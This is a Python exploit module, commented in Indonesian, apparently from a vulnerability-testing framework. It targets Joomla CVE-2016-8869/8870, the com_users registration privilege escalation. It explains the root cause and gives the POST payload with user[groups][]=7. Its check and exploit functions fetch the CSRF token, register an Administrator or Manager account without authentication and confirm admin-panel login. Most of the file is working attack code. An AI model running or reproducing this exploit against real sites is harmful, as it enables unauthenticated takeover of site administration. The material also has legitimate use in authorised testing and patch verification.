#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r"""
Joomla! Core — modul MEGAPACK (klaster joomla_core).

CVE-2016-8869 / CVE-2016-8870 — com_users: escalation via registrasi frontend.
Satu file, dua ID: 8870 didaftarkan sebagai `alias_of` 8869 karena patch 3.6.4
menutup keduanya dengan SATU perubahan yang sama (lihat bukti diff di bawah).

Affected : 3.4.4 - 3.6.3
Patched  : 3.6.4+

ROOT CAUSE — diff resmi 3.6.3 -> 3.6.4 pada
components/com_users/controllers/user.php: SELURUH method register() DIHAPUS.

    3.6.3 (VULNERABLE) — method masih ada:
        public function register()
        {
            JSession::checkToken('post') or jexit(JText::_('JINVALID_TOKEN'));
            $data  = $this->input->post->get('user', array(), 'array');   // <- MENTAH
            $model = $this->getModel('Registration', 'UsersModel');
            $form  = $model->getForm();
            $return = $model->validate($form, $data);
            ...
            $return = $model->register($data);
        }

    3.6.4 (PATCHED) — method dihapus; registrasi hanya lewat
        UsersControllerRegistration (yang menyusun data sendiri).

Model yang dipakai (components/com_users/models/registration.php) tetap sama di
3.6.4 — jadi bug sesungguhnya ada pada JALUR MASUK, bukan model:

    public function register($temp)
    {
        $data = (array) $this->getData();
        foreach ($temp as $k => $v) { $data[$k] = $v; }   // <- POST menimpa SEMUA kunci
        ...
        $user->bind($data);   // termasuk 'groups'
        $user->save();
    }

`getData()` mengisi `groups` dengan grup registrasi default; karena POST boleh
menimpa kunci apa pun, penyerang mengirim `user[groups][]=7` dan pendaftaran
menempatkan akunnya pada grup **Administrator** (akses backend) tanpa autentikasi.

Batas yang tersisa: `JUser::save()` (libraries/joomla/user/user.php) menolak grup
ber-`core.admin` bila pelaku bukan Super Admin ("User not Super Administrator"),
jadi grup 8 (Super Users) TIDAK bisa; grup 6 (Manager) dan 7 (Administrator)
bisa — keduanya punya `core.login.admin`, cukup untuk masuk ke panel admin.

Dampak: privilege escalation tanpa autentikasi (tamu -> akun panel admin).
CWE-269 / CWE-284.

Dipicu tanpa kredensial (butuh token CSRF dari halaman registrasi publik):
    POST /index.php?option=com_users&task=user.register
         user[name]=..&user[username]=..&user[password1]=..&user[password2]=..
         &user[email1]=..&user[email2]=..&user[groups][]=7

Bukti lab (build asli, 2026-11-08):
    3.6.3 : POST -> 303; baris DB jos_user_usergroup_map mencatat group_id=7;
            login /administrator/index.php memuat "Control Panel"/com_cpanel  -> PWN
    3.6.4 : POST -> HTTP 500 (task tidak ada lagi); tidak ada baris pengguna   -> CLEAN
"""

import random
import re
import string


from mp import (CveModule, ST_CLEAN, ST_INFO, ST_PWN, ST_SKIP, ST_UNKNOWN, ST_VULN,
                detect_platform, parse_ver, register, ver_le)

MANIFEST = "/administrator/manifests/files/joomla.xml"
REG_VIEW = "/index.php?option=com_users&view=registration"
REG_TASK = "/index.php?option=com_users&task=user.register"
ADMIN_LOGIN = "/administrator/index.php"

VULN_MIN = (3, 4, 4)
VULN_MAX = (3, 6, 3)
# Grup bawaan Joomla: 6 Manager, 7 Administrator (keduanya punya core.login.admin).
# 8 (Super Users) ditolak JUser::save() untuk pelaku non-Super-Admin.
GROUPS = (7, 6)
TOKEN_RE = re.compile(r'name="([a-f0-9]{32})"')


def _joomla_version(t, h):
    cached = getattr(t, "_jver", None)
    if cached is not None:
        return cached
    val = _joomla_version_uncached(t, h)
    try:
        t._jver = val
    except Exception:  # noqa: BLE001
        pass
    return val


def _joomla_version_uncached(t, h):
    r = h.get(f"{t.url}{MANIFEST}")
    if r is not None and r.status_code == 200 and "<version>" in (r.text or ""):
        m = re.search(r"<version>\s*([0-9][0-9.]*)", r.text)
        if m:
            v = parse_ver(m.group(1))
            if v:
                return v, m.group(1)
    return None, ""


def _in_range(ver):
    if ver is None:
        return None
    if ver[0] != 3:
        return False
    return ver_le(ver, VULN_MAX) and ver >= VULN_MIN


def _token(h, t, path=REG_VIEW):
    """Ambil token CSRF sesi (Joomla 3 memakai nama field = nilainya)."""
    r = h.get(f"{t.url}{path}")
    if r is None:
        return None
    found = TOKEN_RE.findall(r.text or "")
    return found[-1] if found else None


def _task_exists(h, t):
    """
    Probe NON-mutasi: kirim payload registrasi yang PASTI gagal validasi
    (email tidak sah) ke task user.register.
      - method masih ada  -> validasi gagal, Joomla redirect (303) kembali ke form
      - method sudah hilang -> tidak ada redirect ("task not found" / halaman biasa)
    Tidak ada akun yang dibuat pada kedua kasus.
    """
    tok = _token(h, t)
    if not tok:
        return None, "token CSRF tidak ditemukan di halaman registrasi"
    # sengaja TIDAK lengkap: validasi pasti gagal -> tidak ada akun dibuat.
    data = {"user[name]": "x", "user[username]": "x", tok: "1"}
    r = h.post(f"{t.url}{REG_TASK}", data=data,
               headers={"Referer": f"{t.url}{REG_VIEW}"}, allow_redirects=False)
    if r is None:
        return None, "task user.register tidak dapat dihubungi"
    return r.status_code, (r.headers.get("Location", "") or "")


def _register_admin(h, t, group, username, password, email):
    """Kirim registrasi penuh dengan groups[]=<group>. Kembalikan (status, pesan)."""
    tok = _token(h, t)
    if not tok:
        return None, "token CSRF tidak ditemukan"
    data = {
        "user[name]": "MP Escalation",
        "user[username]": username,
        "user[password1]": password,
        "user[password2]": password,
        "user[email1]": email,
        "user[email2]": email,
        "user[groups][]": str(group),
        tok: "1",
    }
    r = h.post(f"{t.url}{REG_TASK}", data=data,
               headers={"Referer": f"{t.url}{REG_VIEW}"})
    if r is None:
        return None, "request registrasi gagal (jaringan)"
    return r.status_code, ""


def _admin_ok(h, t, username, password):
    """
    Bukti capability: login ke /administrator/ dengan kredensial hasil registrasi.
    Return (ok, detail) — ok hanya bila halaman panel benar-benar muncul.
    """
    tok = _token(h, t, ADMIN_LOGIN)
    if not tok:
        return False, "token login backend tidak ditemukan"
    h.post(f"{t.url}{ADMIN_LOGIN}",
           data={"username": username, "passwd": password, "option": "com_login",
                 "task": "login", "lang": "", tok: "1"},
           headers={"Referer": f"{t.url}{ADMIN_LOGIN}"})
    r = h.get(f"{t.url}{ADMIN_LOGIN}")
    if r is None:
        return False, "halaman panel tidak dapat diambil"
    body = r.text or ""
    if "mod-login-username" in body:
        return False, "login ditolak (masih menampilkan form login)"
    for marker in ("com_cpanel", "Control Panel", "com_cpanel-default"):
        if marker in body:
            return True, f"panel admin terbuka (penanda '{marker}')"
    return False, f"panel tidak terkonfirmasi (HTTP {r.status_code})"


def check(t, h, opts):
    plat = detect_platform(t, h)
    if plat != "joomla":
        return ST_SKIP, "bukan Joomla", f"platform={plat}"

    ver, ver_s = _joomla_version(t, h)
    if ver is None:
        return ST_UNKNOWN, "versi Joomla tidak terdeteksi", ""
    if not _in_range(ver):
        return ST_CLEAN, f"Joomla {ver_s} — di luar rentang rentan (3.4.4 - 3.6.3)", \
                         f"version={ver_s}"

    status, loc = _task_exists(h, t)
    ev = f"version={ver_s} | POST {REG_TASK} (payload validasi-gagal)"
    if status is None:
        return ST_UNKNOWN, f"probe registrasi gagal: {loc}", ev
    if status == 303:
        return (ST_INFO,
                f"Joomla {ver_s} — task user.register masih aktif (jalur registrasi "
                f"rentan tersedia): validasi gagal -> redirect {status}",
                ev + f" | HTTP {status}")
    return ST_INFO, (f"Joomla {ver_s} — versi rentan tetapi task user.register tidak "
                     f"lagi mengembalikan redirect (HTTP {status})"), \
                    ev + f" | HTTP {status}"


def exploit(t, h, opts):
    """
    Registrasikan akun ke grup administratif tanpa autentikasi, lalu buktikan
    dengan login ke panel admin (outcome terkontrol: akses panel).
    """
    ver, ver_s = _joomla_version(t, h)
    if ver is None:
        return ST_UNKNOWN, "versi Joomla tidak terdeteksi", ""
    if not _in_range(ver):
        return ST_CLEAN, f"Joomla {ver_s} — di luar rentang rentan (3.4.4 - 3.6.3)", \
                         f"version={ver_s}"

    username = (getattr(opts, "username", None) or "") or ("mpesc" + _rand())
    password = "Megapack!2345"
    email = f"{username}@megapack.local"
    tried = []

    for group in GROUPS:
        st, err = _register_admin(h, t, group, username, password, email)
        if st is None:
            tried.append(f"g{group}: {err}")
            continue
        ok, detail = _admin_ok(h, t, username, password)
        if ok:
            return (ST_PWN,
                    f"escalation TANPA autentikasi: akun '{username}' didaftarkan ke grup "
                    f"{group} dan login panel admin berhasil ({detail})",
                    f"version={ver_s} | group={group} | HTTP {st} | {detail}")
        tried.append(f"g{group}: HTTP {st} -> {detail}")

    return (ST_VULN,
            f"jalur registrasi rentan merespons tetapi akses panel tidak terkonfirmasi; "
            f"percobaan: {'; '.join(tried)}",
            f"version={ver_s} | {'; '.join(tried)}")


def _rand(n=6):
    return "".join(random.choice(string.ascii_lowercase + string.digits)
                   for _ in range(n))


register(CveModule(
    cve="CVE-2016-8869",
    cluster="joomla_core",
    title="Joomla Core - com_users registration privesc tanpa autentikasi "
          "(task=user.register)",
    vclass="privilege escalation",
    cvss="9.8",
    severity="critical",
    cwe="CWE-269",
    product="Joomla! Core (com_users controllers/user.php, UsersModelRegistration)",
    versions_affected="3.4.4-3.6.3",
    status="verified",
    requires=[
        "tidak butuh kredensial",
        "registrasi pengguna aktif (allowUserRegistration=1, default)",
        "token CSRF sesi diambil dari halaman registrasi publik",
    ],
    check=check,
    exploit=exploit,
    notes=("Controller frontend components/com_users/controllers/user.php::register() "
           "mengambil $data = $this->input->post->get('user', array(), 'array') lalu "
           "menyerahkannya ke UsersModelRegistration::register(), yang meng-merge seluruh "
           "kunci POST ke atas data form dan mem-bind-nya ke JUser (termasuk `groups`). "
           "Patch 3.6.4 MENGHAPUS method register() itu dari controller; modelnya sendiri "
           "tidak berubah. Penyerang anonim mendaftarkan akun ke grup 7 (Administrator) "
           "atau 6 (Manager) -> bisa login ke /administrator/. Grup 8 (Super Users) "
           "ditolak JUser::save() ('User not Super Administrator'), jadi outcome realistis "
           "adalah akses panel admin, bukan Super User. URL: "
           "POST /index.php?option=com_users&task=user.register dengan user[groups][]=7. "
           "Diverifikasi di build asli: 3.6.3 -> 303 + baris usergroup_map group_id=7 + "
           "login panel berhasil; 3.6.4 -> HTTP 500 tanpa baris pengguna. "
           "Lab: mp-j363 @8117 (rentan) vs mp-j364 @8118 (patched)."),
))

register(CveModule(
    cve="CVE-2016-8870",
    cluster="joomla_core",
    title="Joomla Core - com_users registration privesc (duplikat jalur CVE-2016-8869)",
    vclass="privilege escalation",
    cvss="9.8",
    severity="critical",
    cwe="CWE-269",
    product="Joomla! Core (com_users controllers/user.php)",
    versions_affected="3.4.4-3.6.3",
    status="documented",
    alias_of="CVE-2016-8869",
    requires=["lihat CVE-2016-8869"],
    check=check,
    exploit=exploit,
    notes=("Didaftarkan sebagai DUPLIKAT/alias CVE-2016-8869: patch resmi 3.6.3 -> 3.6.4 "
           "menutup keduanya dengan satu perubahan identik (penghapusan method "
           "register() di components/com_users/controllers/user.php). Diff 3.6.3 vs 3.6.4 "
           "pada direktori components/com_users hanya memuat file itu, dan satu-satunya "
           "perbedaan isinya adalah blok method register() yang dihapus. Karena tidak ada "
           "perubahan lain yang bisa dipetakan ke ID kedua, modul ini tidak dijalankan "
           "terpisah (injeksi status ganda dihindari)."),
))
